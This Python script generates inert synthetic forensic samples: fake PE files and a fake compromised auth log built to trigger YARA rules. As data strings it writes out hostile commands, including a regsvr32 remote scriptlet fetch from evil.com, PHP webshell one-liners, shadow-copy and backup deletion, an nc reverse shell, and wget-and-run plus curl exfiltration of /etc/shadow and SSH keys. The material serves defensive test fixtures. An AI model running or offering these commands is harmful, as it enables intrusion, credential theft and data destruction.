#!/usr/bin/env python3
"""
Generate synthetic forensic test samples for ForensiX demo.
These are NOT real malware — they contain embedded strings, headers,
and patterns that trigger YARA rules and produce interesting analysis.
"""
import os
import struct
import random

SAMPLE_DIR = os.path.dirname(os.path.abspath(__file__))


def build_pe_trojan():
    """Build a fake PE executable with malware-like strings embedded."""
    # Real PE header (MZ + PE signature)
    mz_header = b'MZ' + b'\x90' * 58 + struct.pack('<I', 128)  # e_lfanew = 128
    dos_stub = b'\x00' * (128 - len(mz_header))
    pe_sig = b'PE\x00\x00'
    
    # COFF header (i386, 1 section)
    coff = struct.pack('<HHIIIHH',
        0x014C,  # Machine: i386
        1,       # NumberOfSections
        0x64B9A000,  # Timestamp (2023)
        0, 0,    # PointerToSymbolTable, NumberOfSymbols
        0x00E0,  # SizeOfOptionalHeader
        0x0102   # Characteristics: EXECUTABLE_IMAGE | 32BIT_MACHINE
    )
    
    optional_header = b'\x0B\x01' + b'\x00' * 222  # PE32 optional header (stub)
    
    # Suspicious strings that will trigger YARA + strings tool
    payload_strings = [
        b"cmd.exe /c net user admin P@ssw0rd /add\x00",
        b"powershell -enc JABjAGwAaQBlAG4AdAAgAD0A\x00",
        b"WScript.Shell\x00",
        b"CreateRemoteThread\x00",
        b"VirtualAlloc\x00",
        b"WriteProcessMemory\x00",
        b"LoadLibraryA\x00",
        b"GetProcAddress\x00",
        b"InternetOpenUrl\x00",
        b"HttpSendRequest\x00",
        b"WSAStartup\x00",
        b"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\x00",
        b"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\x00",
        b"http://185.220.101.45:4443/beacon.bin\x00",
        b"https://malware-c2.evil.ru/exfil?data=\x00",
        b"http://45.33.32.156:8080/update.exe\x00",
        b"C:\\Users\\victim\\AppData\\Local\\Temp\\payload.dll\x00",
        b"C:\\Windows\\System32\\svchost.exe -k netsvcs\x00",
        b"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\x00",
        b"rundll32.exe shell32.dll,ShellExec_RunDLL\x00",
        b"regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll\x00",
        b"password\x00",
        b"credential\x00",
        b"CryptEncrypt\x00",
        b"CryptGenKey\x00",
        b"SetWindowsHookEx\x00",
        b"GetAsyncKeyState\x00",
        b"GetForegroundWindow\x00",
        b"ws2_32.dll\x00",
        b"wininet.dll\x00",
        b"advapi32.dll\x00",
        b"ntdll.dll\x00",
        b"kernel32.dll\x00",
        b"ShellExecuteA\x00",
        b"CreateProcessA\x00",
        b"GetTempPathA\x00",
        b"DropFile\x00",
        b"decrypt\x00",
        b"base64_decode\x00",
        b"xor_cipher\x00",
        b"bot_id=FORENSIX_DEMO_2024\x00",
        b"formgrabber_inject\x00",
        b"user-agent: forensix-malware-demo/1.0\x00",
        b"192.168.1.100\x00",
        b"10.0.0.1\x00",
        b"172.16.0.50\x00",
        b"C:\\Windows\\Temp\\dropper.exe\x00",
        b"C:\\Windows\\System32\\drivers\\rootkit.sys\x00",
        b"\\Device\\PhysicalMemory\x00",
        b"NtQuerySystemInformation\x00",
    ]
    
    # Add random binary noise between strings
    data = mz_header + dos_stub + pe_sig + coff + optional_header
    for s in payload_strings:
        data += os.urandom(random.randint(16, 64)) + s
    
    # Pad to realistic size
    data += os.urandom(32768)
    
    path = os.path.join(SAMPLE_DIR, "suspicious_trojan.exe")
    with open(path, "wb") as f:
        f.write(data)
    print(f"  ✓ Created {path} ({len(data)} bytes)")


def build_ransomware_sample():
    """Build a fake ransomware executable."""
    mz_header = b'MZ' + b'\x90' * 58 + struct.pack('<I', 128)
    dos_stub = b'\x00' * (128 - len(mz_header))
    pe_sig = b'PE\x00\x00'
    coff = struct.pack('<HHIIIHH', 0x014C, 1, 0x65A00000, 0, 0, 0x00E0, 0x0102)
    optional_header = b'\x0B\x01' + b'\x00' * 222
    
    payload_strings = [
        b"YOUR FILES HAVE BEEN ENCRYPTED!\x00",
        b"Send 0.5 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\x00",
        b"bitcoin wallet address\x00",
        b"ransom_note.txt\x00",
        b"CryptEncrypt\x00",
        b"CryptGenKey\x00",
        b"CryptAcquireContext\x00",
        b"CryptImportKey\x00",
        b"AES-256-CBC\x00",
        b"RSA-2048\x00",
        b".locked\x00",
        b".encrypted\x00",
        b".crypted\x00",
        b"C:\\Users\\*\\Documents\\*.*\x00",
        b"C:\\Users\\*\\Desktop\\*.*\x00",
        b"C:\\Users\\*\\Pictures\\*.*\x00",
        b"vssadmin delete shadows /all /quiet\x00",
        b"bcdedit /set {default} recoveryenabled No\x00",
        b"wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\x00",
        b"cmd.exe /c del /Q /F %TEMP%\\*.exe\x00",
        b"CreateProcessA\x00",
        b"WriteFile\x00",
        b"FindFirstFileW\x00",
        b"FindNextFileW\x00",
        b"http://ransom-payment.onion/pay?id=\x00",
        b"DO NOT TRY TO DECRYPT FILES YOURSELF\x00",
        b"kernel32.dll\x00",
        b"advapi32.dll\x00",
        b"crypt32.dll\x00",
    ]
    
    data = mz_header + dos_stub + pe_sig + coff + optional_header
    for s in payload_strings:
        data += os.urandom(random.randint(8, 48)) + s
    data += os.urandom(24576)
    
    path = os.path.join(SAMPLE_DIR, "ransomware_demo.exe")
    with open(path, "wb") as f:
        f.write(data)
    print(f"  ✓ Created {path} ({len(data)} bytes)")


def build_suspicious_log():
    """Build a suspicious log file with attack patterns."""
    lines = [
        "2024-03-15 08:00:01 sshd[1234]: Accepted publickey for admin from 203.0.113.50 port 22",
        "2024-03-15 08:00:15 kernel: [UFW BLOCK] SRC=45.33.32.156 DST=192.168.1.10 PROTO=TCP DPT=4444",
        "2024-03-15 08:01:22 sshd[1240]: Failed password for root from 185.220.101.45 port 55832 ssh2",
        "2024-03-15 08:01:23 sshd[1241]: Failed password for root from 185.220.101.45 port 55833 ssh2",
        "2024-03-15 08:01:24 sshd[1242]: Failed password for root from 185.220.101.45 port 55834 ssh2",
        "2024-03-15 08:01:25 sshd[1243]: Failed password for root from 185.220.101.45 port 55835 ssh2",
        "2024-03-15 08:01:26 sshd[1244]: Failed password for root from 185.220.101.45 port 55836 ssh2",
        "2024-03-15 08:01:27 sshd[1245]: Failed password for root from 185.220.101.45 port 55837 ssh2",
        "2024-03-15 08:01:28 sshd[1246]: Failed password for root from 185.220.101.45 port 55838 ssh2",
        "2024-03-15 08:01:29 sshd[1247]: Failed password for root from 185.220.101.45 port 55839 ssh2",
        "2024-03-15 08:01:30 sshd[1248]: Failed password for admin from 185.220.101.45 port 55840 ssh2",
        "2024-03-15 08:01:31 sshd[1249]: Accepted password for admin from 185.220.101.45 port 55841 ssh2",
        "2024-03-15 08:02:00 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
        "2024-03-15 08:02:15 bash[1300]: HISTORY: PID=1300 UID=0 whoami",
        "2024-03-15 08:02:18 bash[1300]: HISTORY: PID=1300 UID=0 cat /etc/shadow",
        "2024-03-15 08:02:25 bash[1300]: HISTORY: PID=1300 UID=0 wget http://185.220.101.45:8080/backdoor.sh -O /tmp/bd.sh",
        "2024-03-15 08:02:30 bash[1300]: HISTORY: PID=1300 UID=0 chmod +x /tmp/bd.sh",
        "2024-03-15 08:02:31 bash[1300]: HISTORY: PID=1300 UID=0 /tmp/bd.sh",
        "2024-03-15 08:02:45 bash[1300]: HISTORY: PID=1300 UID=0 crontab -e",
        "2024-03-15 08:02:50 crontab[1310]: (root) REPLACE (root)",
        "2024-03-15 08:03:00 bash[1300]: HISTORY: PID=1300 UID=0 nc -lvp 4444 -e /bin/bash",
        "2024-03-15 08:03:15 kernel: [UFW ALLOW] SRC=185.220.101.45 DST=192.168.1.10 PROTO=TCP DPT=4444",
        "2024-03-15 08:03:30 bash[1300]: HISTORY: PID=1300 UID=0 tar czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /home/admin/.ssh/",
        "2024-03-15 08:03:45 bash[1300]: HISTORY: PID=1300 UID=0 curl -X POST http://185.220.101.45:8080/upload -F 'file=@/tmp/exfil.tar.gz'",
        "2024-03-15 08:04:00 bash[1300]: HISTORY: PID=1300 UID=0 rm -rf /tmp/bd.sh /tmp/exfil.tar.gz /var/log/auth.log",
        "2024-03-15 08:04:15 bash[1300]: HISTORY: PID=1300 UID=0 history -c",
        "2024-03-15 08:05:00 sshd[1249]: session closed for user admin",
    ]
    
    path = os.path.join(SAMPLE_DIR, "auth_log_compromised.log")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  ✓ Created {path} ({len(lines)} log entries)")


def build_webshell_sample():
    """Build a PHP webshell-like file embedded in binary."""
    mz_header = b'MZ' + b'\x90' * 58 + struct.pack('<I', 128)
    dos_stub = b'\x00' * (128 - len(mz_header))
    
    webshell_strings = [
        b"<?php eval(base64_decode($_POST['cmd'])); ?>\x00",
        b"<?php system($_GET['c']); ?>\x00",
        b"passthru\x00",
        b"shell_exec\x00",
        b"/var/www/html/uploads/shell.php\x00",
        b"http://evil-domain.tk/shell/c99.php\x00",
        b"http://evil-domain.tk/admin/upload.php\x00",
        b"192.168.1.50\x00",
        b"10.10.10.100\x00",
        b"cmd.exe /c net localgroup administrators hacker /add\x00",
        b"CreateRemoteThread\x00",
        b"VirtualAlloc\x00",
        b"WriteProcessMemory\x00",
        b"LoadLibraryA\x00",
        b"HttpSendRequest\x00",
        b"InternetOpenUrl\x00",
        b"WSAStartup\x00",
        b"connect\x00",
        b"socket\x00",
        b"recv\x00",
        b"send\x00",
        b"ws2_32.dll\x00",
        b"wininet.dll\x00",
        b"WScript.Shell\x00",
        b"C:\\Windows\\Temp\\persist.exe\x00",
        b"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\backdoor\x00",
        b"keylogger_v2.dll\x00",
    ]
    
    data = mz_header + dos_stub + b'PE\x00\x00'
    data += struct.pack('<HHIIIHH', 0x014C, 1, 0x65B00000, 0, 0, 0x00E0, 0x0102)
    data += b'\x0B\x01' + b'\x00' * 222
    for s in webshell_strings:
        data += os.urandom(random.randint(16, 48)) + s
    data += os.urandom(16384)
    
    path = os.path.join(SAMPLE_DIR, "webshell_dropper.exe")
    with open(path, "wb") as f:
        f.write(data)
    print(f"  ✓ Created {path} ({len(data)} bytes)")


if __name__ == "__main__":
    print("ForensiX — Generating test samples...")
    print()
    build_pe_trojan()
    build_ransomware_sample()
    build_suspicious_log()
    build_webshell_sample()
    print()
    print("Done! All samples created in:", SAMPLE_DIR)
